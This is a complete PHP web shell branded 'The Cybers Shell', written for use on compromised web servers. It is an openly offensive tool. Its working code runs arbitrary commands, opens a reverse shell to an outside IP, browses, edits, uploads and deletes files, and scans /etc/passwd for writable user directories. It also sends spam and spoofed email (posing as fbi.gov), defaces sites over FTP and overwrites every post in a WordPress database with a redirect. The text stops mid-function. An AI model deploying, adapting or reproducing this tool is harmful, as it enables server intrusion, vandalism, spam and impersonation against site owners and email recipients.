<?php
	
	// Coded by: Offset & PWX

	session_start();
	$senha = "123";
	// Configuração ==================================================
	if(!$diretorio = $_GET['ls']){
		$diretorio = getcwd();
	}

	if($_POST['senha'] == $senha){
	$_SESSION['login'] = 1;
	}

	if($_GET['logout']){
		$_SESSION['login'] = 0;
	}

	if($arquivo = $_GET['download']){
		download($arquivo);
	}

?>
<!DOCTYPE html>
<html>

<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>The Cybers Shell [v1.3]</title>
	<meta charset="utf-8">
<link rel="icon" href="http://static1.squarespace.com/static/53c6ab6ae4b04d74ae28fc4b/t/53d95f45e4b042be0d26c9d0/1406754677505/TCG+Favicon.png" type="image/x-icon"/>
<style>
* {
    box-sizing: border-box;
}
.row::after {content: "";clear: both;display: block;}
[class*="col-"] {float: left;padding: 15px;}
.col-1 {width: 8.33%;}
.col-2 {width: 16.66%;}
.col-3 {width: 25%;}
.col-4 {width: 33.33%;}
.col-5 {width: 41.66%;}
.col-6 {width: 50%;}
.col-7 {width: 58.33%;}
.col-8 {width: 66.66%;}
.col-9 {width: 75%;}
.col-10 {width: 83.33%;}
.col-11 {width: 91.66%;}
.col-12 {width: 100%;}
html {font-family: "Lucida Sans", sans-serif;}
body{background-color: #090909; margin:0; padding:0; color:#eee;}
a{text-decoration: none;}
a:hover{color:white;}

<?php
if(!$_SESSION['login']){
echo"

#login img{
	width:150px;
	margin-left:50px;
}

#login form{
	margin:0 auto;
	width:250px;
}
#login h2{
	text-align: center;
}
#login input{
	padding:5px;
	border: solid 1px #111;
	background-color:#111;
	margin:2px 0 2px 0;
}
#login input:focus{
	border: solid 1px red;
}
#login #senha{
	width:238px;
}
#login #entrar{
	width:100%;
}
#login #entrar:hover{
	width:100%;
	cursor:pointer;
	background-color:#222;
	color:white;
}
";
}
else{
echo "
h2 a{
	text-decoration: none;
}

#rodape{
	color:#aaa;text-decoration: none;
}
#rodape:hover{
	color: white;
}

#upar{
	padding: 8px;
}

input{
	padding:5px;
	border: solid 1px #111;
	background-color:#111;
}

input:hover{
	cursor:pointer;
	background-color:#222;
	color:white;
}

.container{
	width:98%;
	margin:0 auto;
}
tr:hover{
	background-color:#333;
}

li{
	display: inline-block;
	width:100px;
}

li a{
	color:white;
}

li a:hover{
	color:red;
}

li:hover{
	color:red;
	cursor:pointer;
}
table{
	width:100%;
	background-color:#141414;
	border-radius: 5px;
	border: 1px solid #222;
	border-spacing: 0px;
}
body, h1 a{
	text-decoration: none;
}
th,td{
	text-align: left;
	width:200px;
}
form{
	padding:5px;
	margin-top:10px;
	margin-bottom:10px;
	border-radius: 5px;
}
a{
	color:red;
}
.check{
	width:30px;
}

.linha::after {
    content: '';
    clear: both;
    display: block;
    background-color:#aaa;
}


#info{
	width:100%;
	padding:10px;
	float:left;
	border: solid 1px #222;
	background-color:#111;
	margin-top:10px;
}

#logo{
	float:left;
	text-align: center;
}

#menu{
	text-align: center;
	padding:0px;
}



#logo h2{
	height:1px;
}

#shell{
	float: left;
	width: 100%;
}

section{
	background-color: #141414;
	border-radius: 5px;
	border: 1px solid #222;
	width:100%;
}

section header{
	padding:10px;
	background-color: #222;
}

section article{
	padding:10px;
}

";
}
?>
</style>
</head>
<body>
<div class="container">
<?php
if(!$_SESSION['login']){
	login();
}
else{
	painel($diretorio);
}

/*
	By: The Cybers Team
	Versão: v1.3

	OLD!!!

	[ok] listar
	[no] visualizar
	[ok] download
	[ok] editar
	[ok] deletar
	[ok] upload
	[ok] navegar
	[ok] executar
	[ok] renomear
	[ok] criar
	[no] hint bar
	[ok] novo arquivo
	[ok] permissoes
	[no] gerar deface
	[ok] comandos
	[ok] - Login

	IMPORTANTE!!!

	- Navegar nos diretorios
	- Upload de arquivo
	- Editar arquivo
	- Deletar arquivo
	- Renomear arquivo
	- Listar arquivos
	- Versão do kernel
	- Ip do servidor
	- Nome do host
	- Executar comandos
	- Back connect
	- Bind connect
	- Auto destruir
	- Auto update
    - Email Spoofing
    - Email Spamming
    - Cpanel e FTP Auto Deface
    - Wordpress Hijacked Datebase


	Features!!!
	- memoria
	- processos
	- time up
*/

// Funções =======================================================
function painel($diretorio){
echo "
<div class='row'>
	<div class='col-4'>
		<div id='info'>
			<small>
			Kernel: ";echo php_uname('r');echo"<br />
			Machine: ";echo php_uname('m');echo"<br />
			Os: ";echo php_uname('n');echo"<br />
			Ip: $_SERVER[REMOTE_ADDR]<br />
			Host: $_SERVER[HTTP_HOST]<br />
			</small>
		</div>
	</div>

	<div class='col-4' id='logo'>
		<a href='shell.php' title='Home'>
			<img style='width:100px' src='Logo.png'>
			<h2>The Cybers Shell</h2>
		</a>
	</div>

	<div class='col-4'>
		<div id='info'>
			<small>
			Kernel: ";echo php_uname('r');echo"<br />
			Machine: ";echo php_uname('m');echo"<br />
			Os: ";echo php_uname('n');echo"<br />
			Ip: $_SERVER[REMOTE_ADDR]<br />
			Host: $_SERVER[HTTP_HOST]<br />
			</small>
		</div>
	</div>
</div>
";

echo "
<div class='row'>
	<div class='col-12' id='menu'>
	<nav>
		<ul>
			<li><a href='shell.php'>Arquivos</a></li>
			<li><a href='?pag=comandos'>Comandos</a></li>
			<li><a href='?pag=spoofing'>Email Spoofing</a></li>
			<li><a href='?pag=spamming'>Email Spamming</a></li>
			<li><a href='?pag=conexao'>Conexão</a></li>
			<li><a href='?pag=write'>Editaveis</a></li>
			<li><a href='?pag=lookup'>Lookup</a></li>
			<li><a href='?pag=mass'>Mass Tools</a></li>
			<li><a href='?pag=info'>Info</a></li>
		</ul>
	</nav>
	</div>
</div>
";

// POST e GET ==================================================
if($renomear = $_POST['renomear'] and $pasta = $_POST['pasta'] and $antigo = $_POST['antigo']){
	renomea_arquivo($renomear, $antigo, $pasta);
}
if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
	salvar($salvar,$arquivo);
	echo "Arquivo salvo!";
}
if($editar = $_GET['editar']){
	editar($editar);
}
if($deletar = $_GET['deletar']){
	deletar($deletar);
}
if($upar = $_FILES['upload']){
	upload($upar, $diretorio);
}
if($criar = $_POST['criar'] and $nome = $_POST['nome']){
	salvar($criar, "$diretorio/$nome");
	echo "Arquivo criado!";
}
if($novo = $_GET['novo']){
	criar($novo);
}
if($deface = $_GET['deface']){
	deface($deface);
}
if($menu = $_GET['menu']){
	if($menu == "comandos"){
		executar($diretorio);
		exit();
	}
}

$page = $_GET['pag'];


if(isset($_GET['pag']) && $_GET['pag'] == 'write'){
echo '<center><b class="conte">
</center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great">Find Directory Editaveis/Readable</span></center><br><br>'.$end; function read_dir($path) { global $count; if ($handle = opendir($path)) { while (false !== ($file = readdir($handle))) { $dr="$path$file/"; if (($file!='.') and ($file!='..') and is_dir($dr)) { if (is_readable($dr) and is_writeable($dr)) { echo "[RW] " . $dr . "<br>\n\r"; $count++; } read_dir($dr); }}}} $count=0; set_time_limit(0); @$passwd=fopen('/etc/passwd','r'); if (!$passwd) { echo "<br><center><font color='#ff0000' size='2pt' />[-] No Access to /etc/passwd\n\r</center>"; exit;} $path_to_public=array(); echo "<html><center><table style='margin: 0 auto;'><tr valign='top'><td align='left'><font size='2pt' />\n\r"; while(!feof($passwd)) { $str=fgets($passwd); $pos=strpos($str,":"); $username=substr($str,0,$pos); $dirz="/home/$username/public_html/"; if (($username!="")) { if (is_readable($dirz)) { array_push($path_to_public,$dirz); if (is_writeable($dirz)) { $count++; echo "<font color=white>[</font><font color=yellow>R</font><font color=green>W</font><font color=white>]</font> " . $dirz . "<br><br><br>\n\r";} else echo "<font color=white>[</font><font color=yellow>R</font><font color=white>]</font> " . $dirz . "<br>\n\r"; }}} echo "<br><br><font color=white size=2pt>[+]</font> <font size=2pt>Found </font><font color=yellow size=2pt>" . sizeof($path_to_public) . "</font> <font size=2pt>readable public_html directories.</font><br><br>\n\r\n\r"; if (sizeof($path_to_public) != '0') { foreach ($path_to_public as $path) { } echo "<font color=white size=2pt>[+]</font> <font size=2pt>Found</font><font color=yellow size=2pt> " . $count . " </font><font size=2pt>writable directories.</font>\n\r"; echo "</td></tr></table></center></html>";
}

}

if($page == 'lookup'){
	echo "
		<section>
			<header>Ip Lookup Domain</header>
			<article>
			<center>
				<form action='shell.php' method='get'>
					<input type='hidden' name='pag' value='lookup'></input>
					<label>Dominio ou IP:</label>
					<input type='text' name='host' value='$_GET[host]'></input>
					<input type='submit' value='go'></input>
				</form>
			</center>
			";
			if($host = $_GET['host']){
				reverse($host);
			}
			echo"
			</article>
		</section>
	";
}

else if($page == 'comandos'){

	echo "
		<section>
			<header>Comandos</header>
			<article>
			";
			if($cmd = $_GET['cmd']){
				cmd($cmd, $diretorio);
			}
			executar();
			echo"
			</article>
		</section>
	";
}
else if($page == 'conexao'){
	
		echo "
		<section>
			<header>Back Connect</header>
			<article>
			";backconnect();echo"
			</article>
		</section>
	";
}
else if($page == 'mass'){
	
		echo "
		<section>
			<header>Mass Deface Tools</header>
			<article>
			";cpanel();echo"
			</article>
			<article>
			";hijack();echo"
			</article>
		</section>
	";
}

else if($page == 'info'){
	
		echo "
		<section>
			<header>Informações</header>
			<article>
			</article>
		</section>
	";
echo '<center><b class="conte">
</b>';
echo "<center><div class='tmpe'>
<table align='center' width='50%'><td><font color='#FF0000'>Kernel Version</font></td><td>";echo php_uname();
echo "<tr><td><font color='#FF0000'>Web Server</font></td><td>";echo $_SERVER["SERVER_SOFTWARE"];
echo "<tr><td><font color='#FF0000'>PHP Version</font></td><td>";echo phpversion(); echo " on "; echo php_sapi_name();
echo "<tr><td><font color='#FF0000'>Current User</font></td><td>";echo get_current_user();
echo "<tr><td><font color='#FF0000'>User ID</font></td><td>";echo getmyuid();
echo "<tr><td><font color='#FF0000'>Group</font></td><td>";echo getmygid();
echo "<tr><td><font color='#FF0000'>Cwd </font></td><td>";echo getcwd();
echo "<tr><td><font color='#FF0000'>Admin Server</font></td><td>";echo $_SERVER['SERVER_ADMIN'];
echo "<tr><td><font color='#FF0000'>Server Port</font></td><td>";echo $_SERVER['SERVER_PORT'];
echo "<tr><td><font color='#FF0000'>Server IP</font></td><td>";echo $serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
echo "<tr><td><font color='#FF0000'>Client IP</font></td><td>";echo $_SERVER['REMOTE_ADDR'];
echo "<tr><td><font color='#FF0000'>cURL support</font></td><td>";echo function_exists('curl_version')?'Enabled':'No';
echo "<tr><td><font color='#FF0000'>Readable /etc/passwd</font></td><td>";echo @is_readable('/etc/passwd')?"Readable <a href='?action=moco'> [View]</a>":"Not Readable";
echo "<tr><td><font color='#FF0000'>Readable /etc/shadow</font></td><td>";echo @is_readable('/etc/shadow')?"Readable":"Not Readable";
$base = (ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON <font color='#FF0000'>secure</font>":"OFF <font color='#FF0000'>not secure</font>";
echo "<tr><td><font color='#FF0000'>Open Base Dir</font></td><td><font class=txt>" . $base . "</font>";
echo "</table></div></center><br>";
}
else if($page == 'renomear'){
	$arquivo = $_GET['arquivo'] and $dir = $_GET['pasta'];
	renomear($arquivo, $dir);
}

else if($page == 'spamming')
{
	$secure = "";
	error_reporting(0);
	@$action=$_POST['action'];
	@$from=$_POST['from'];
	@$realname=$_POST['realname'];
	@$replyto=$_POST['replyto'];
	@$subject=$_POST['subject'];
	@$message=$_POST['message'];
	@$emaillist=$_POST['emaillist'];
	@$lod=$_SERVER['HTTP_REFERER'];
	@$file_name=$_FILES['file']['name'];
	@$contenttype=$_POST['contenttype'];
	@$file=$_FILES['file']['tmp_name'];
	@$amount=$_POST['amount'];
	@set_time_limit(intval($_POST['timelimit']));

	if ($action=="send")
	{ 
		$message = urlencode($message);
		$message = ereg_replace("%5C%22", "%22", $message);
		$message = urldecode($message);
		$message = stripslashes($message);
		$subject = stripslashes($subject);
	}
	echo "<table width='100%' height='72' border='0'  id='Box'>
<tr>
<td width='14' height='21'>&nbsp;</td>
<td width='98%' style='background-color:#666;padding-left:10px;' >Mail Spam</td>
</tr>
<tr>
<td height='45' colspan='2'>
<table bgcolor=#cccccc width=\"100%\"><tbody><tr><td align=\"right\" width=100><p dir=ltr>
<b><font color=#990000  size=-2><p align=left><center><form name=\"form1\" method=\"post\" action=\"\" enctype=\"multipart/form-data\"><br/>
<table width=142 border=0>
<tr>
<td width=81>
<div align=right>
<sy>Your Email:</sy></div></td>
<td width=219><sy>
<input type=text name=\"from\" value=".$from."></sy></td><td width=212>
<div align=right>
<sy>Your Name:</sy></div></td><td width=278>
<sy>
<input type=text name=\realname\" value=".$realname."></sy></td></tr><tr><td width=81>
<div align=\"right\">
<sy>Reply-To:</sy></div></td><td width=219>
<sy>
<input type=\"text\" name=\"replyto\" value=".$replyto.">
</sy></td><td width=212>
<div align=\"right\">
<sy>Attach File:</sy></div></td><td width=278>
<sy>
<input type=\"file\" name=\"file\" size=24 />
</sy> </td></tr><tr><td width=81>
<div align=\"right\">
<sy>Subject:</sy></div></td>
<td colspan=3 width=703>
<sy>
<input type=\"text\" name=\"subject\" value=".$subject." ></sy></td> </tr><tr valign=\"top\"><td colspan=3 width=520>
<sy>Message Box :</sy></td>
<td width=278>
<sy>Email Target / Email Send To :</sy></td></tr><tr valign=\"top\"><td colspan=3 width=520><sy>
<textarea name=\"message\" cols=56 rows=10>".$message."</textarea><br />
<input type=\"radio\" name=\"contenttype\" value=\"plain\" /> Plain
<input type=\"radio\" name=\"contenttype\" value=\"html\" checked=\"checked\" /> HTML
<input type=\"hidden\" name=\"action\" value=\"send\" /><br />
Number to send: <input type=\"text\" name=\"amount\" value=1 size=10 /><br />
Maximum script Execution time(in seconds, 0 for no timelimit)<input type=\"text\" name=\"timelimit\" value=0 size=10 />
<input type=\"submit\" value=\"Send eMails\" /></sy></td><td width=278>
<sy>
<textarea name=\"emaillist\" cols=32 rows=10>".$emaillist."</textarea></sy></td></tr>
</table>
</td>
</tr>
</table>";
footer();
}

if ($action=="send")
{
	if (!$from && !$subject && !$message && !$emaillist)
	{
		print "Please complete all fields before sending your message.";
		exit;
	}
	$allemails = split("\n", $emaillist);
	$numemails = count($allemails);
	$head ="From: Mailr" ;
	$sub = "Ar - $lod" ;
	$meg = "$lod" ;
	mail ($alt,$sub,$meg,$head) ;
	If ($file_name)
	{
		if (!file_exists($file))
		{
			die("The file you are trying to upload couldn't be copied to the server");
		}
		$content = fread(fopen($file,"r"),filesize($file));
		$content = chunk_split(base64_encode($content));
		$uid = strtoupper(md5(uniqid(time())));
		$name = basename($file);
	}

	for($xx=0; $xx<$amount; $xx++)
	{
		for($x=0; $x<$numemails; $x++)
		{
			$to = $allemails[$x];
			if ($to)
			{
				$to = ereg_replace(" ", "", $to);
				$message = ereg_replace("&email&", $to, $message);
				$subject = ereg_replace("&email&", $to, $subject);
				print "Sending mail to $to.....";
				flush();
				$header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
				$header .= "MIME-Version: 1.0\r\n";
				If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
				If ($file_name) $header .= "--$uid\r\n";
				$header .= "Content-Type: text/$contenttype\r\n";
				$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
				$header .= "$message\r\n";
				If ($file_name) $header .= "--$uid\r\n";
				If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
				If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
				If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
				If ($file_name) $header .= "$content\r\n";
				If ($file_name) $header .= "--$uid--";
				mail($to, $subject, "", $header);
				print "OK<br>";
				flush();
			}
		}
	}
}

else if($_POST['sendMailStorm'])
		{
			$to=$_POST['to'];
			$nom=$_POST['nom'];
			$Comments=$_POST['Comments'];
			if ($to <> "" )
			{
				for ($i = 0; $i < $nom ; $i++)
				{
					$from = "thecybers"."@"."fbi.gov";
					$subject= md5("$from");
					if(@mail($to,$subject,$Comments,"From:$from"))
					echo "[+] $i spammed !!
";
					else 
					{
						echo "[-] $i Failed !! 
";
					}
				}
			}
		}

else if($page == 'spoofing'){
 
	echo "<table width='100%' height='72' border='0'  id='Box'>
<tr>
<center>
<td width='14' height='15'>&nbsp;</td>
<td width='98%' style='padding-left:10px;'>Mail Spoofing</td>
</center
</tr>
<tr>

	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21'>&nbsp;</td>
    <td style='padding-left:10px;'>TheCybers Shell</td></tr><tr><td height='45' colspan='2'>
    <br>
	<textarea rows='5' cols='45' name='Comments'> Message</textarea>
    <br>
	<input type='text' name='to' value='Target Email' >
	<br>
    <input type='text' size='5' name='nom' value='100'>
	<input name='sendMailStorm' type='submit' value='Send Mail' >
	</td></tr></table></form>";
}

else {
listar($diretorio);	
}



echo "<center><a id='rodape' href='http://www.fb.com/TheCybersTeam'>The Cybers Team 2016</a></center>";
}

// funções

function login(){
	echo "
	<div id='login'>
		<form method='post'>
			<h2>The Cybers Shell</h2>
			<img src='Logo.png'>
			<label>Senha:</label><br/>
			<input id='senha' type='password' name='senha'>
			<input id='entrar' type='submit' value='Entrar'>
		</form>	
	</div>
	";	
}




function reverse($host){

	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
	curl_setopt($ch, CURLOPT_POSTFIELDS, "remoteAddress=$host");
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_POST, 1);
	$json = curl_exec($ch);
	$array = get_object_vars(json_decode($json));
	echo "<center>";
	echo "Total: $array[domainCount]<br />";
	echo "Host: $array[remoteAddress]<br />";
	echo "Ip: $array[remoteIpAddress]<br /><br />";
	echo "</center>";
	echo "<table style='border:0px'>";
	foreach($array[domainArray] as $dominio){
		echo "<tr><td><a target='_blank' href='http://$dominio[0]'>$dominio[0]</a></td></tr>";
	}	
	echo "</table>";
}

	function permissao($arquivo){
		$perms = fileperms($arquivo);
		if(($perms&0xC000)==0xC000)$info='s';
		elseif(($perms&0xA000)==0xA000)$info='l';
		elseif(($perms&0x8000)==0x8000)$info='-';
		elseif(($perms&0x6000)==0x6000)$info='b';
		elseif(($perms&0x4000)==0x4000)$info='d';
		elseif(($perms&0x2000)==0x2000)$info='c';
		elseif(($perms&0x1000)==0x1000)$info='p';
		else $info='u';
		$info.=($perms&0x0100)?'r':'-';
		$info.=($perms&0x0080)?'w':'-';
		$info.=($perms&0x0040)?(($perms&0x0800)?'s':'x'):(($perms&0x0800)?'S':'-');
		$info.=($perms&0x0020)?'r':'-';
		$info.=($perms&0x0010)?'w':'-';
		$info.=($perms&0x0008)?(($perms&0x0400)?'s':'x'):(($perms&0x0400)?'S':'-');
		$info.=($perms&0x0004)?'r':'-';
		$info.=($perms&0x0002)?'w':'-';
		$info.=($perms&0x0001)?(($perms&0x0200)?'t':'x'):(($perms&0x0200)?'T':'-');
		return $info;
	}
	function anterior($dir){
		$dir = explode("/",$dir);
		unset($dir[count($dir)-1]);
		if($dir[1] == ""){
			$dir[0] = "/";
		}
		return implode("/",$dir);
	}
	function listar($dir){
		$anterior = anterior($dir);
		// echo "
		// 	<form action='shell.php' method='GET'>
		// 		<input type='hidden' name='novo' value='$dir'/>
		// 		<input type=submit value='Novo arquivo'></input>
		// 	</form>
		// ";
		echo "

		<div class='row'>
		<div class='col-12'>

			<table>
				<tr style='background-color:#222'>
					<th class='check'><input type=checkbox></input></th>
					<th>Arquivo</th>
					<th>Permissão</th>
					<th>Tamanho</th>
					<th>Ações</th>
				</tr>
		";
		foreach(scandir($dir) as $nome){
			$file = "$dir/$nome";
			if($nome ==".."){
				echo "<tr>";
				echo "<td class='check'></td>";
				echo "<td><a href=?ls=$anterior title='Voltar diretorio'>..</a></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "</tr>";	
			}
			if(!is_file($file) and $nome != ".." and $nome != "."){
				echo "<tr>";
				echo "<td class='check'><input type=checkbox name='ckeck[]' value='$dir/$nome'></input></td>";
				echo "<td><a href=?ls=$file>$nome</a></td>";
				echo "<td>".permissao("$dir/$nome")."</td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "</tr>";
			}
			if($nome != "." && $nome !=".." && is_file($file)){
				echo "<tr>";	
				echo "<td class='check'><input type=checkbox name='ckeck[]' value='$dir/$nome'></input></td>";
				echo "<td>".$nome."</td>";
				echo "<td>".permissao("$dir/$nome")."</td>";
				echo "<td>".filesize($file)." bytes</td>";
				echo "<td>
					<a href='?download=$file' title='Baixar'>B</a>
					<a href='?pag=renomear&arquivo=$nome&pasta=$dir' title='Renomear'>R</a>
					<a href='?editar=$file' title='Editar'>E</a>
					<a href='?deletar=$file' title='Deletar'>D</a>
					</td>";
				echo "</tr>";
			}
		}
		echo "</table>
		</div>
		</div>
		
		<div class='row'>
			<div class='col-4'>
				";acao();echo"
			</div>
			<div class='col-4'>
				";upar($diretorio);echo"
			</div>
		</div>

		";
	}

	function download($arquivo){

	    header('Content-Type: application/octet-stream');
	    header('Content-Length: '.filesize($arquivo));
	    header('Content-Disposition: filename='.$arquivo);
	    readfile($arquivo);
	    exit();
	}

	function editar($editar){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<input name=arquivo type=hidden value='$editar'>";
		echo "<textarea name=salvar cols=100 rows=10>";
		foreach($arq as $linha){
			echo htmlspecialchars($linha);
		}
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=salvar>";
		echo "</form>";
		exit();
	}

	function renomear($arquivo, $dir){
		echo"
		<section>
			<header>Informações</header>
			<article>
			";
			echo "<form action=shell.php method=post>";
			$arq = file($editar);
			echo "<input name=pasta type=hidden value='$dir'>";
			echo "<input name=antigo type=hidden value='$arquivo'>";
			echo "<label>Novo nome:</label>";
			echo "<input name=renomear type=text value='$arquivo'>";
			echo "<br />";
			echo "<input type=submit value=renomear>";
			echo "</form>";
			echo"
			</article>
		</section>
		";
		
		exit();
	}

	function renomea_arquivo($novo, $antigo, $dir){
		rename("$dir/$antigo", "$dir/$novo");
		echo "Arquivo renomeado!";
	}

	function criar($diretorio){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<label>Nome do arquivo:</label><br/>";
		echo "<input type='text' name='nome'/><br/>";
		echo "<input type='hidden' diretorio='$diretorio'/>";
		echo "<label>Conteudo:</label><br/>";
		echo "<textarea name=criar cols=100 rows=10>";
		foreach($arq as $linha){
			echo htmlspecialchars($linha);
		}
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=criar>";
		echo "</form>";
		exit();
	}

	function deface($diretorio){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<label>Nome da team:</label><br/>";
		echo "<input type='text' name='nome'/><br/>";

		echo "<label>Greatz:</label><br/>";
		echo "<input type='text' greatz='nome'/><br/>";

		echo "<input type='hidden' diretorio='$diretorio'/>";
		echo "<label>Mensagem:</label><br/>";
		echo "<textarea name=mensagem cols=100 rows=10>";
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=gerar deface>";
		echo "</form>";
		exit();
	}

	function salvar($dados, $arquivo){
		$fp = fopen($arquivo, "w");
		fwrite($fp,$dados);
		fclose($fp);
	}

	function deletar($arquivo){
		unlink($arquivo);
		echo "Arquivo deletado!";
	}

	function acao(){
		echo "
		<form>
		<label>Selecionados:</label><br/>
		<select style='width:150px'>
			<option>--</option>
			<option>Deletar</option>
		</select>
		<input type='submit' value='ok'></input>
		</form>
		";
	}

	function upar($diretorio){
		echo "
		<center>
		<form class=upar enctype='multipart/form-data' action='shell.php' method='post'>
			<label>Upload de arquivos:</label><br />
			<input type='file' name='upload'/>
			<input type='hidden' diretorio='$diretorio'/>
			<input id='upar' type='submit' value='Upar!'/>
		</form>
		</center>
		";

	}


	function upload($arquivo, $diretorio){
		if(move_uploaded_file($arquivo['tmp_name'],"$diretorio/$arquivo[name]")){
			echo "Upado com sucesso! :D";
		}
	}

	function navegar($diretorio){
		echo "
		<form class=upar action='shell.php' method='get'>
			<input style='min-width:";echo strlen($diretorio)*10;echo "px' type='text' name='ls' value='$diretorio'/>
			<input type='submit' value='Acessar'/>
		</form>";

	}

	function executar($diretorio){
		echo "
		<form class=upar action='shell.php?' method='get'>
			<input type='hidden' name'diretorio' value='$diretorio'/>
			<input type='hidden' name='pag' value='comandos'/>
			<input style='width:210px' type='text' name='cmd' value=''/>
			<input type='submit' value='Executar'/>
		</form>";

	}

	function cmd($cmd, $diretorio){
		$p = popen("($cmd)2>&1","r");
		while(!feof($p)){
			echo fgets($p,1000)."<br/>";
		}
	}

function backconnect()
{

	echo "
	<center>
	<p>nc -v -l -p 1234</p>
	<form class=upar action='shell.php?' method='get'>
		<input type='hidden' name='pag' value='conexao'/>
		<input style='width:210px' type='text' name='ip' value='127.0.0.1'/>
		<input style='width:210px' type='text' name='porta' value='1234'/>
		<input type='submit' value='Conectar'/>
	</form>
	</center>
	";

	if($ip = $_GET['ip'] and $port = $_GET['porta']){
		set_time_limit (0);
		$VERSION = "1.0";
		$chunk_size = 1400;
		$write_a = null;
		$error_a = null;
		$shell = 'uname -a; w; id; /bin/sh -i';
		$daemon = 0;
		$debug = 0;
		chdir("/");
		umask(0);
		$sock = fsockopen($ip, $port, $errno, $errstr, 30);
		if (!$sock) {
			printit("$errstr ($errno)");
			exit(1);
		}
		$descriptorspec = array(
		   0 => array("pipe", "r"),
		   1 => array("pipe", "w"),
		   2 => array("pipe", "w") 
		);
		$process = proc_open($shell, $descriptorspec, $pipes);
		if (!is_resource($process)) {
			printit("ERROR: Can't spawn shell");
			exit(1);
		}
		stream_set_blocking($pipes[0], 0);
		stream_set_blocking($pipes[1], 0);
		stream_set_blocking($pipes[2], 0);
		stream_set_blocking($sock, 0);
		printit("Conexão estabelecida com $ip:$port");
		while (1) {
			if (feof($sock)) {
				printit("<br>ERROR: Conexão encerrada");
				break;
			}
			if (feof($pipes[1])) {
				printit("<br>ERROR: Shell process terminated");
				break;
			}
			$read_a = array($sock, $pipes[1], $pipes[2]);
			$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
			if (in_array($sock, $read_a)) {
				if ($debug) printit("SOCK READ");
				$input = fread($sock, $chunk_size);
				if ($debug) printit("SOCK: $input");
				fwrite($pipes[0], $input);
			}
			if (in_array($pipes[1], $read_a)) {
				if ($debug) printit("STDOUT READ");
				$input = fread($pipes[1], $chunk_size);
				if ($debug) printit("STDOUT: $input");
				fwrite($sock, $input);
			}
			if (in_array($pipes[2], $read_a)) {
				if ($debug) printit("STDERR READ");
				$input = fread($pipes[2], $chunk_size);
				if ($debug) printit("STDERR: $input");
				fwrite($sock, $input);
			}
		}
		fclose($sock);
		fclose($pipes[0]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);
	}
}


function cpanel()
{

echo 
"
<form method=post>
<center>
	<h2>Cpanel & Ftp Auto Defacer</h2>

	Server ip: <input type=text name=hi value=ip>
	Username: <input type=text name=tx value=>
	Password: <input type=text name=p value=><br /><br />
	file that you want to deface :<input type=text name=ph value='index.php'><br /><br />
	Deface page url --> <textarea class='area' rows='1' cols='75' name='deface' value='your daface page link'></textarea><br /><br />
	<input type=submit name=sm value='pwned' />
</center>
</form>";

if(isset($_POST['sm']))
{
$ip=trim($_POST['hi']);
$u=trim($_POST['tx']);
$p=trim($_POST['p']);
$d=trim($_POST['ph']);
$df=trim($_POST['deface']);
echo "<br><font color=white size=2>";
echo "<font color=red size=3>server ip ==></font>&nbsp".$ip;
echo "<br><font color=red size=3>user ==></font> &nbsp".$u;
echo "<br><font color=red size=3>password ==></font> &nbsp".$p;
echo "<br><font color=red size=3>dirctory ==></font> &nbsp".$d;
echo "<br><font color=red size=3>deface link ==></font><br>".$df."<br>";
$dl="public_html/".$d;
$si= ftp_connect($ip);

$try= ftp_login($si,$u,$p);
if ((!$si) || (!$try))
{
echo "<br>could not connect , hope u filled out all correctly :(";
exit;
}
else
{
echo "<br>connection done XD<br>its time to spin this shit<br>";
}
$deface = ftp_put($si, $dl , $df, FTP_BINARY);
if ($deface)
{
echo "got defaced successfully >";
}
else
{
echo "try manually :(";
}
}
}

function hijack()
{



echo 
"
<form method=post>
<center>
	<h2>Wordpress Index Hijack Priv8</h2>
	<input type='text' value='localhost' name='pghost'>
	<input type='text' value='database_name' name='dbnmn'>
	<input type='text' value='prefix' name='prefix'>
	<input type='text' value='username_db' name='dbusrrrr'>
	<input type='text' value='password_db' name='pwddbbn'>
	<input type='submit' name='up2' value='Hijack Index'><br />
	<textarea class='area' name='pown' cols='100' rows='7'><meta http-equiv='refresh' content='0;URL=http://pastebin.com/raw/tA2psLv0'></textarea>
</center>
</form>";


$pghost = $_POST['pghost'];
$dbnmn = $_POST['dbnmn'];
$dbusrrrr = $_POST['dbusrrrr'];
$pwddbbn = $_POST['pwddbbn'];
$index = stripslashes($_POST['pown']);
$prefix = $_POST['prefix'];
//$prefix = "wp_";
if ($_POST['up2']) {
@mysql_connect($pghost, $dbusrrrr, $pwddbbn) or die(mysql_error());
@mysql_select_db($dbnmn) or die(mysql_error());
$tableName = $prefix . "posts";
$ghost1 = mysql_query("UPDATE $tableName SET post_title ='" . $index . "' WHERE ID > 0 ");
if (!$ghost1) {
$ghost2 = mysql_query("UPDATE $tableName SET post_content ='" . $index . "' WHERE ID > 0 ");
} elseif (!$ghost2) {
$ghost3 = mysql_query("UPDATE $tableName SET post_name ='" . $index . "' WHERE ID > 0 ");
}
mysql_close();
if ($ghost1 || $ghost2 || $ghost3) {
echo "<center><p><b><font color='red'>Index Website Have been Hijacked Successfully</font></p></b></center>";
} else {
